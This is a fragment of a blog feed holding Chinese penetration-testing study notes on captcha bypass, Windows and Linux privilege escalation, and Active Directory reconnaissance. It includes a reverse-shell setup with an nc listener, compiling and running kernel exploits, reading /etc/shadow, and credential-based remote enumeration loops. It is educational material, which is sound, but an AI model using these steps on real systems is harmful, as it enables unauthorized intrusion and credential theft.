    <content type="html"><![CDATA[<h2 id="内网安全-网络知识"><a href="#内网安全-网络知识" class="headerlink" title="内网安全-网络知识"></a>内网安全-网络知识</h2><ul><li><p>隧道技术: 解决不出网协议上线的问题(利用出网协议进行封装出网)(如TCP -&gt; UDP)</p></li><li><p>代理技术: 解决网络通讯不通的问题(利用跳板机建立节点后续操作)</p></li><li><p>连接方向: 正向&amp;方向(内找外&#x2F;外找内)</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内网安全-网络知识&quot;&gt;&lt;a href=&quot;#内网安全-网络知识&quot; class=&quot;headerlink&quot; title=&quot;内网安全-网络知识&quot;&gt;&lt;/a&gt;内网安全-网络知识&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;隧道技术: 解决不出网协议上线的问题(利用出网协议进行封装出网)(</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WEB攻防-验证码安全</title>
    <link href="https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8.html"/>
    <id>https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8.html</id>
    <published>2024-05-07T09:32:21.000Z</published>
    <updated>2024-05-07T14:24:11.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h2><h4 id="找回密码客户端回显-Response状态值-修改重定向"><a href="#找回密码客户端回显-Response状态值-修改重定向" class="headerlink" title="找回密码客户端回显&amp;Response状态值&amp;修改重定向"></a>找回密码客户端回显&amp;Response状态值&amp;修改重定向</h4><ul><li><p>用回显状态判断-res前端判断不安全</p><ul><li><p>不安全方式:</p></li><li><pre><code>错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;浏览器   错误错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;burp代理抓包改为&lt;1&gt;-&gt;浏览器   正确--客户端验证为准</code></pre></li><li><p>安全方式:</p><pre><code>错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;burp代理抓包改为&lt;1&gt;-&gt;浏览器显示正确-&gt;服务器后端验证错误-&gt;失败--服务器验证为准</code></pre></li></ul></li><li><p>用用户名重定向-修改标示绕过验证</p></li><li><p>验证码回显显示验证码泄漏验证虚设</p><ul><li>数据包中就有没有加密或加密过的验证码</li></ul></li><li><p>验证码简单机制验证码过于简单爆破</p><ul><li>如四位数字简单验证码(0000~9999), 仅10000钟可能, 如没有次数限制, 可以爆破</li></ul></li></ul><h4 id="验证码验证安全机制-爆破-复用-识别"><a href="#验证码验证安全机制-爆破-复用-识别" class="headerlink" title="验证码验证安全机制-爆破&amp;复用&amp;识别"></a>验证码验证安全机制-爆破&amp;复用&amp;识别</h4><ul><li>验证码简单机制-验证码过于简单爆破</li><li>验证码重复使用验证码验证机制绕过</li><li>验证码智能识别-验证码图形码被识别</li><li>验证码接口调用-验证码触发机制枚举</li></ul><h4 id="验证码技术验证码爆破，验证码复用，验证码识别等"><a href="#验证码技术验证码爆破，验证码复用，验证码识别等" class="headerlink" title="验证码技术验证码爆破，验证码复用，验证码识别等"></a>验证码技术验证码爆破，验证码复用，验证码识别等</h4><ul><li>识别工具:<ul><li><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">smxiazi&#x2F;NEW_xp_CAPTCHA: xp_CAPTCHA(瞎跑 白嫖版) burp 验证码 识别 burp插件 (github.com)</a></li><li><a href="https://github.com/c0ny1/captcha-killer">c0ny1&#x2F;captcha-killer: burp验证码识别接口调用插件 (github.com)</a></li></ul></li></ul><h4 id="安全修复方案"><a href="#安全修复方案" class="headerlink" title="安全修复方案"></a>安全修复方案</h4><ul><li>找回机制要进行每一步验证-防绕过重定向</li><li>找回机制要进行服务端验证-防s数据修改</li><li>找回机制要控制验证码安全防验证码攻击</li><li>验证码接口需验证后被调用-防接口被乱调用</li><li>验证码弱引用智能化人工判断-防验证码被识别</li><li>验证码采用时间段生效失效-防验证码被复用</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;验证码安全&quot;&gt;&lt;a href=&quot;#验证码安全&quot; class=&quot;headerlink&quot; title=&quot;验证码安全&quot;&gt;&lt;/a&gt;验证码安全&lt;/h2&gt;&lt;h4 id=&quot;找回密码客户端回显-Response状态值-修改重定向&quot;&gt;&lt;a href=&quot;#找回密码客户端回显-Resp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.html</id>
    <published>2024-04-18T03:44:47.000Z</published>
    <updated>2024-05-20T03:24:32.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>Web权限获取: 插件应用, 数据库, 中间件, 网站源码后台获取… </p><p>网站前台: REC漏洞, 代码执行, 命令执行, 写文件, 写shell</p><h4 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h4><ul><li>Linux:<ul><li>管理员UID为0: 系统的管理员用户</li><li>系统用户UID为1~999</li><li>普通用户UID从1000开始</li></ul></li><li>Windows<ul><li>用户及组: system(相当于root) administrator user guest等</li></ul></li></ul><h4 id="具体的几种权限"><a href="#具体的几种权限" class="headerlink" title="具体的几种权限"></a>具体的几种权限</h4><ul><li>后台权限:<ul><li>获取方式: 爆破、注入猜解，弱口令等</li><li>⼀般网站或应用后台智能操作应用的界面内容, 数据图片等信息，无法操作程序的源代码或服务器上的资源文件</li><li>权限提取:<ul><li>通过账户密码等信息获取数据库等权限</li><li>通过文件编辑操作获取网站权限Webshell等</li></ul></li></ul></li><li>网站权限<ul><li>获取方式: 写文件等</li><li>查看或修改（还要看有没有锁权）程序源代码，可以进行网站或应用的配置文件读取（接口配置信息、数据库配置信息等），还能收集服务器操作系统等相关的信息，为后续系统提权做准备</li></ul></li><li>数据库权限<ul><li>获取方式: 源码或配置文件泄露, webshell进行配置文件读取等</li><li>操作数据库的权限，数据库的增删改查等</li><li>权限提取:<ul><li>获取敏感数据, 获取后台权限</li><li>写入文件, 获取webshell</li></ul></li></ul></li><li>接口权限<ul><li>获取方式: 后台（修改配置信息功能点），网站权限（查看配置文件获取）</li><li>邮件、短信、支付等功能接口</li></ul></li></ul><h3 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h3><h4 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h4><h5 id="操作前提"><a href="#操作前提" class="headerlink" title="操作前提"></a>操作前提</h5><ul><li>本地用户 当前计算机的某个用户</li><li>Web权限 当前计算机的web权限 建立在web权限已经取得的情况下进行权限提升</li></ul><h5 id="成功条件"><a href="#成功条件" class="headerlink" title="成功条件"></a>成功条件</h5><ul><li>符合的操作系统</li><li>符合的溢出漏洞</li></ul><h5 id="常见步骤"><a href="#常见步骤" class="headerlink" title="常见步骤"></a>常见步骤</h5><ol><li><p><strong>信息收集</strong></p><ul><li><p>收集: 操作系统版本, 漏洞补丁, 位数(32&#x2F;64) 杀软防护, 网络, 当前用户权限 等信息</p></li><li><p>常用命令:</p><pre><code>versysteminfowhoaminetstat -anotasklist /svc</code></pre></li></ul></li><li><p>基于补丁和系统版本 位数籁进行可用溢出漏洞EXP, 上传EXP调用执行去提权</p><ul><li><p>操作方式-<strong>推荐使用自动提权</strong>:</p><ul><li><p>基于手工操作</p></li><li><p>基于CS半自动提权</p></li><li><p>基于MSF全自动提权</p></li></ul></li><li><p>手工提取工具:</p><ul><li><a href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan: 基于主机的漏洞扫描工具 (github.com)</a></li><li><a href="https://github.com/vulmon/Vulmap">Vulmap: 在线本地漏洞扫描器(github.com)</a></li><li><a href="https://github.com/bitsadmin/wesng">wesng：Windows 漏洞利用建议器 - 下一代 (github.com)</a></li><li><strong>网页</strong>:<a href="https://i.hacking8.com/tiquan">提权辅助网页 Windows提权辅助 (hacking8.com)</a></li></ul></li><li><p>寻找EXP利用 - 通过漏洞编号查找:</p><ul><li><strong>推</strong>:<a href="https://github.com/Ascotbe/Kernelhub">Ascotbe&#x2F;Kernelhub: Linux、macOS、Windows 提权漏洞合集(github.com)</a></li><li><a href="https://gitlab.com/exploit-database/exploitdb">Exploit-DB &#x2F; Exploits + Shellcode + GHDB · GitLab</a></li><li><a href="https://github.com/nomi-sec/PoC-in-GitHub">nomi-sec&#x2F;PoC-in-GitHub：📡从 GitHub 自动收集 PoC。</a></li><li><a href="https://github.com/k8gege/Ladon">k8gege&#x2F;Ladon: Ladon大型内网渗透工具</a></li></ul></li></ul></li></ol><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><h4 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h4><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><p>通常, 在拥有一个webshell的时候, 一般权限都是web权限, 权限较低, 只能执行一些命令, 如查看当前用户, 网络, ip信息等, 如果想进行内网渗透就需要将权限提到最高, 如系统权限, 超级管理员权限</p><h5 id="创建交互shell"><a href="#创建交互shell" class="headerlink" title="创建交互shell"></a>创建交互shell</h5><ul><li><p>linux提权需要交互shell</p></li><li><p>使用工具perl-reverse-shell.pl建立sockets, 本地可以使用nc监听端口<code>nc -vvip 1234</code></p></li></ul><h5 id="查看发行版"><a href="#查看发行版" class="headerlink" title="查看发行版"></a>查看发行版</h5><ul><li><p><code>cat /etc/issue</code></p></li><li><p><code>cat /etc/*release</code></p></li><li><p>查看内核版本<code>uname -a</code></p></li></ul><h5 id="查看可用的提权exp"><a href="#查看可用的提权exp" class="headerlink" title="查看可用的提权exp"></a>查看可用的提权exp</h5><ul><li><a href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)</a></li></ul><h5 id="进行提取"><a href="#进行提取" class="headerlink" title="进行提取"></a>进行提取</h5><ul><li><p>在目标机编译exp, 如果编译不成功在本地编译后上传到目标上<br><code>gcc exp.c -o exp</code></p></li><li><p>增加运行权限<br><code>chmod +x exp</code></p></li><li><p>运行exp</p></li><li><p>切换shell-&gt;<code>/bin/bash</code><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p></li><li><p>查询当前用户id</p></li><li><p>查询机密文件如<code>/etc/shadow</code></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;权限提升&quot;&gt;&lt;a href=&quot;#权限提升&quot; class=&quot;headerlink&quot; title=&quot;权限提升&quot;&gt;&lt;/a&gt;权限提升&lt;/h2&gt;&lt;p&gt;Web权限获取: 插件应用, 数据库, 中间件, 网站源码后台获取… &lt;/p&gt;
&lt;p&gt;网站前台: REC漏洞, 代码执行, </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全-信息收集</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</id>
    <published>2024-04-11T11:50:10.000Z</published>
    <updated>2024-06-01T01:49:20.145Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="一-收集本机信息"><a href="#一-收集本机信息" class="headerlink" title="一.收集本机信息"></a>一.收集本机信息</h3><h4 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h4><ul><li><p><code>ipconfig /all</code>  在<code>Windows IP 配置</code>项下</p></li><li><p><code>Systeminfo</code> 在”域”词条下, 图中显示为WORKGROUP, 说明没有域<br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-16%20162703.png?raw=true"></p></li><li><p><code>net time /domain</code></p><ul><li><p>存在域并且当前用户是域用户<br><img src="C:\Users\Myprefer\Desktop\640.jpg"></p></li><li><p>存在域，当前用户不是域用户<br>回显:</p><pre><code>发生系统错误 5拒绝访问</code></pre></li><li><p>不存在域</p><p><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20152845.png?raw=true"></p></li></ul></li></ul><h4 id="查看当前登录域"><a href="#查看当前登录域" class="headerlink" title="查看当前登录域"></a>查看当前登录域</h4><ul><li><p><code>net config workstation</code></p><p><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20153107.png?raw=true"></p></li></ul><p>​图中工作站域为workgroup, 则不存在域</p><ul><li><p>ping命令</p><pre><code class="sh">for /L %I in(1,1,254) DO @ping -w 1 -n 1 192.168.110.%I | findstr &quot;TTL=&quot;</code></pre></li><li><p>使用工具扫描探测</p><ul><li><p><strong>nbtscan</strong> - 一个在本地或远程TCP&#x2F;IP网络上扫描开放的NETBIOS名称服务器的命令行工具</p><ul><li><p><a href="https://github.com/resurrecting-open-source-projects/nbtscan">resurrecting-open-source-projects&#x2F;nbtscan: Scan networks searching for NetBIOS information (github.com)</a></p></li><li><pre><code class="sh">用法: nbtscan-unixwiz [选项] 目标 [目标...]   目标可以是IP地址，DNS名称或地址的列表范围。   范围可以表示成“192.168.12.0/24”或“192.168.12.64-97”   -V        显示版本信息   -f        显示完整的NBT资源记录响应(推荐)   -H        生成HTTP请求头   -v        开启详细输出调试   -n        不查找响应IP地址的反向名称   -p &lt;n&gt;    绑定UDP端口(默认0)   -m        响应中包含MAC地址 (等同&#39;-f&#39;)   -T &lt;n&gt;    超时不响应 (默认2秒)   -w &lt;n&gt;    次写入后等待秒数 (默认10ms)   -t &lt;n&gt;    每个地址尝试次数(默认1次)   -P        以perl的hashref格式生成结果</code></pre></li></ul></li><li><p><strong>arp-scan</strong> - ARP扫描工具</p><ul><li>使用: <a href="https://blog.csdn.net/newbeixue/article/details/123111543">arp-scan使用-CSDN博客</a></li></ul></li></ul></li></ul><h4 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h4><ul><li><p><strong>telnet</strong> 命令扫描</p><pre><code class="sh">telnet &lt;address&gt; &lt;port&gt;</code></pre></li><li><p><strong>metasploit</strong> 的端口扫描模块<br><a href="https://blog.csdn.net/weixin_44255856/article/details/97900038">渗透之metasploit技术-端口扫描，漏洞利用_search portscan-CSDN博客</a></p></li><li><p><strong>Nmap</strong></p></li></ul><h4 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h4><ul><li><code>net group &quot;Domain Controllers&quot; /domain</code></li><li><code>nltest /DCLIST:&lt;域名&gt;</code></li><li><code>nslookup -type=SRV _LDAP._tcp</code></li><li><code>net time /domain</code></li><li><code>netdom query pdc</code></li></ul><h4 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h4><ul><li><p><strong>查询所有域用户列表</strong>：</p><ul><li><p><code>net user /domain</code></p></li><li><p><code>wmic useraccount get /all</code></p></li><li><p><code>dsquery user</code></p></li><li><p><code>net localgroup administrators /domain</code></p></li></ul></li><li><p><strong>查询域管理员用户组</strong>:</p><ul><li><code>net group &quot;Enterprise Admains&quot; /domain</code></li></ul></li><li><p><strong>定位域管理员</strong>:</p><ul><li><p><strong>PsLoggedon</strong> - <a href="https://blog.csdn.net/qq_44159028/article/details/115439633">定位域管理员_psloggedon-CSDN博客</a><br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20105737.png?raw=true"></p></li><li><p><strong>AdFind</strong>- <a href="https://blog.csdn.net/weixin_43571641/article/details/124263803">域内信息查询工具AdFind_adfind download-CSDN博客</a></p></li><li><p><strong>PVEFindADUser</strong> - <a href="https://blog.csdn.net/qq_44159028/article/details/115439633">定位域管理员 PVEFindADUser-CSDN博客</a><br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20110437.png?raw=true"></p></li></ul></li><li><p><strong>查找域管理进程</strong>:</p><ul><li><p>本机检查：</p><ul><li><pre><code class="sh">net group &quot;Domain Admins&quot;/domain    //获取域管理员列表</code></pre></li><li><pre><code class="sh">tasklist /v       // 列出本机所有进程及进程用户</code></pre><p><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20110732.png?raw=true"></p></li></ul></li></ul></li><li><p><strong>查询域控制器的域用户会话</strong>：</p><ul><li><p>收集域控制器的列表</p><pre><code class="sh">net group &quot;Domain Controllers&quot;/domain</code></pre></li><li><p>收集域管理员列表</p><pre><code class="sh">net group &quot;Domain Admins&quot;/domain</code></pre></li><li><p><strong>Netsess</strong><br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20111100.png?raw=true"></p></li></ul></li><li><p><strong>扫描远程系统上运行的任务：</strong></p><ul><li><p>前提是目标使用了本地域管理员共享账户</p><pre><code class="sh">FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist/V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in(names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %nwas found running a process on %i &amp;&amp; pause</code></pre></li></ul></li><li><p><strong>扫描远程系统上NetBIOS信息</strong>：</p><pre><code class="sh">for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp;nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt)DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n wasfound logged into %i</code></pre></li></ul><h4 id="利用PowerShell收集域内信息"><a href="#利用PowerShell收集域内信息" class="headerlink" title="利用PowerShell收集域内信息"></a>利用PowerShell收集域内信息</h4><h5 id="命令汇总"><a href="#命令汇总" class="headerlink" title="命令汇总"></a>命令汇总</h5><ul><li><p>域信息收集</p><pre><code class="powershell">net time /domain                            #查看时间服务器net config workstation                      #查询当前登录域及登录用户信息net user /domain                            #查询域内用户wmic useraccount get /all                   #查询域内用户的详细信息net user xie /domain                        #查看指定域用户xie的详细信息net view /domain                            #查看有几个域net view /domain:xxx                        #查看域内的主机net group /domain                           #查看域里面的组net group &quot;domain users&quot;  /domain           #查看域用户net group &quot;domain controllers&quot; /domain      #查看域控制器net group &quot;domain computers&quot; /domain        #查看域内所有的主机net group &quot;domain admins&quot;  /domain          #查看域管理员,该组内的成员对域控拥有完全控制权net group &quot;enterprise admins&quot; /domain       #查看企业管理组,该组内的成员对域控拥有完全控制权net group &quot;domain guest&quot;  /domain           #查看域访客组,权限较低 nltest  /domain_trusts                      #查看域信任信息net accounts /domain                        #查询域密码策略whoami /user                                #查看用户SID和域SID，如用户的SID是：S-1-5-21-2189311154-2766837956-1982445477-520 则域SID则是去掉最后的520：S-1-5-21-2189311154-2766837956-1982445477 以下命令只能在域控上查询dsquery user                                #查询目录中的用户dsquery computer                            #查询目录中的主机dsquery group                               #查询目录中的组.dsquery ou                                  #查询目录中的组织单元.dsquery site                                #查询目录中的站点dsquery server                              #查询域控dsquery contact                             #查询目录中的联系人dsquery subnet                              #查询目录中的子网dsquery quota                               #查询目录中的配额规定.dsquery partition                           #查询目录中的分区.dsquery *                                   #用通用的LDAP查询来查找目录中的任何对 dsquery server –domain xie.com | dsget server–dnsname –site     #搜索域内域控制器的DNS主机名和站点名dsquery computer domainroot –name -xp –limit 10      #搜索域内以-xp结尾的机器10台dsquery user domainroot –name admin -limit           #搜索域内以admin开头的用户10个</code></pre></li><li><p>查询域控的主机名</p><pre><code class="powershell">方法一：net group &quot;domain controllers&quot; /domain       #这里查询结果后面会多一个 $ 方法二：nltest /DCLIST:xie.com方法三：net time /domain 方法四：nslookup -type=srv _ldap._tcp方法五：查看DNS服务器的地址，一般DNS服务器的IP就是域控的地址方法六：netdom query pdc                             #该命令只能在域控上执行方法七：dsquery server                               #该命令只能在域控上执行</code></pre></li></ul><h5 id="利用PowerSploit"><a href="#利用PowerSploit" class="headerlink" title="利用PowerSploit"></a>利用PowerSploit</h5><ul><li><p>PowerShell 常用的执行权限共有四种</p><pre><code class="sh">Restricted：默认设置，不允许执行任何脚本。Allsigned：只能运行经过证书验证的脚本。Unrestricted：权限最高，可以执行任意脚本。RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。</code></pre><p>在 PowerShell 中输入“Get-ExecutionPolicy”，可以看到当前权限<br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20112615.png?raw=true"></p></li><li><p>使用<strong>PowerSploit</strong>的<strong>PowerView</strong>脚本</p><ul><li><p>导入脚本</p><pre><code class="sh">Import-Module .\PowerView.ps1</code></pre></li><li><p>功能:</p><pre><code class="sh">Get-NetDomain    // 获取当前用户所在的域名称。Get-NetUser    // 返回所有用户的详细信息。Get-NetDomainController    // 获取所有域控制器。Get-NetComputer    // 获取所有域内机器的详细信息。Get-NetOU    // 获取域中的 OU 信息。Get-NetGroup    // 获取所有域内组和组成员信息。Get-NetFileServer    // 根据 SPN 获取当前域使用的文件服务器。Get-NetShare    // 获取当前域内所有网络共享。Get-NetSession    // 获取在指定服务器存在的会话信息。Get-NetRDPSession    // 获取在指定服务器存在的远程连接信息。Get-NetProcess    // 获取远程主机的进程信息。Get-UserEvent    // 获取指定用户的日志信息。Get-ADObject    // 获取活动目录的对象信息。Get-NetGPO    // 获取域所有组策略对象。Get-DomainPolicy    // 获取域默认或域控制器策略。Invoke-UserHunter    // 用于获取域用户登录计算机及该用户是否有本地管理权限。</code></pre></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h2&gt;&lt;h3 id=&quot;一-收集本机信息&quot;&gt;&lt;a href=&quot;#一-收集本机信息&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全-基本概念</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html</id>
    <published>2024-04-10T07:41:44.000Z</published>
    <updated>2024-04-11T13:22:59.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网基本概念"><a href="#内网基本概念" class="headerlink" title="内网基本概念"></a>内网基本概念</h2><h4 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h4><p>又称内网, 是指在某一区域内由多台计算机互联成的计算机组。</p><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p><strong>工作组（Work Group）就像一个可以自由进入和退出的社团</strong>，方便同组的计算机互相访问。没有集中管理作用，所有计算机都是<strong>对等的</strong>。</p><ul><li>在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</li><li>为了解决这一问题，早在Windows 9x&#x2F;NT&#x2F;2008就引用了“<strong>工作组</strong>”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。</li><li>你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。</li></ul><h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p><strong>域（Domain）是一个有安全边界的计算机集合</strong>。可以简单的把域理解成升级版的工作组，但有一个严格的集中管理控制机制。</p><ul><li>与工作组的“松散会员制”有所不同，“域”是一个相对严格的组织。“域”指的是服务器控制网络上的计算机能否加入的计算机组合。</li><li>实行严格的管理对网络安全是非常必要的。在对等网模式下，任何一台电脑只要接入网络，就可以访问共享资源。尽管对等网络上的共享文件可以加访问密码，但是非常容易被破解。在由Windows 9x构成的对等网中，<strong>数据是非常不安全的</strong>。</li><li><em>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的<strong>门卫</strong>一样，称为“<strong>域控制器（Domain Controller，简写为DC）</strong>”。“域控制器”中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，只能以对等网用户的方式访问Windows共享出来的资源，这样就一定程度上<strong>保护</strong>了网络上的资源</em></li><li>想把一台电脑加入域，仅仅使它和服务器在“网上邻居”能够相互看到是远远不够的，必须要由网络管理员进行把这台电脑加入域的相关操作。</li></ul><h4 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器-DC"></a>域控制器-DC</h4><p><strong>域控制器（Domain Controller，DC）相当于一个单位的门禁系统。DC中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</strong>。</p><p><strong>DC是整个域的通信枢纽。</strong></p><ul><li>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP&#x2F;IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题</li></ul><h4 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录-AD"></a>活动目录-AD</h4><p><strong>活动目录（Active Directory，AD）</strong>是指域环境中提供目录服务的组件</p><p>在目录中存储的信息可以是用户，组，计算机，共享资源，打印机，联系人等信息。目录服务可以帮助用户快速准确地从目录中找到需要的信息服务。</p><ul><li><p>活动目录主要提供的功能：</p><blockquote><p>账号集中管理：所有账号存储在服务器中，方便执行命令。</p><p>软件集中管理：统一推送软件，安装网络打印机。</p><p>增强安全性：统一部署杀毒软件，病毒扫描任务，集中管理计算机权限，统一制定用户密码策略等。</p></blockquote></li></ul><p>如果内网中的一台计算机上安装了AD，它就变成了DC（用于存储AD库的计算机）。</p><ul><li>DC的本质是一台计算机，AD的本质是提供目录服务的组件。</li></ul><h4 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h4><p>将一组安全等级相同的计算机划入同一个网段内， 在网络边界上通过防火墙来实现对其他安全域的NACL（网络访问控制策略）， <strong>使得其风险最小化</strong>。</p><p><strong>一般安全域划分为：DMZ和内网。</strong></p><ul><li><p><strong>DMZ（Demilitarized Zone 非军事化区）称为隔离区。 为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</strong></p><p>DMZ不能访问内网，DMZ不能访问外网（此策略有例外，如mail服务）。</p></li><li><p><strong>内网又可以划分为：办公区和核心区。</strong></p><p>办公区会安装防病毒软件、主机入侵检测产品（HIDS）等，运维使用堡垒机（跳板机）来统一管理用户的登陆行为。</p></li></ul><h4 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h4><ul><li><p>单域</p><p>例如主公司和子公司都独自形成了一个域环境，称为单域，由此延伸出<strong>父域和子域</strong>。</p></li><li><p>父域和子域</p><p>父域可以管理子域。</p></li><li><p>域树和域森林</p><p>域的框架结构，很多分支形成了域森林。</p></li></ul><h4 id="内网常用命令"><a href="#内网常用命令" class="headerlink" title="内网常用命令"></a>内网常用命令</h4><blockquote><p>net user ——&gt; 本机用户列表<br>net localhroup administrators ——&gt; 本机管理员[通常含有域用户]<br>net user &#x2F;domain ——&gt; 查询域用户<br>net group &#x2F;domain ——&gt; 查询域里面的工作组<br>net group “domain admins” &#x2F;domain ——&gt; 查询域管理员用户组<br>net localgroup administrators &#x2F;domain ——&gt; 登录本机的域管理员<br>net localgroup administrators workgroup\user001 &#x2F;add —–&gt;域用户添加到本机<br>net group “Domain controllers” ——-&gt; 查看域控制器(如果有多台)<br>ipconfig &#x2F;all ——&gt; 查询本机IP段，所在域等<br>net view ——&gt; 查询同一域内机器列表<br>net view &#x2F;domain ——&gt; 查询域列表<br>net view &#x2F;domain:domainname —–&gt; 查看workgroup域中计算机列表</p></blockquote><h4 id="内网渗透基本流程"><a href="#内网渗透基本流程" class="headerlink" title="内网渗透基本流程"></a>内网渗透基本流程</h4><ol><li><em>信息收集</em></li><li><em>权限获取</em></li><li><em>横向移动</em></li><li><em>权限维持</em></li><li><em>痕迹消除</em></li></ol>]]></content>
    
    
      
      
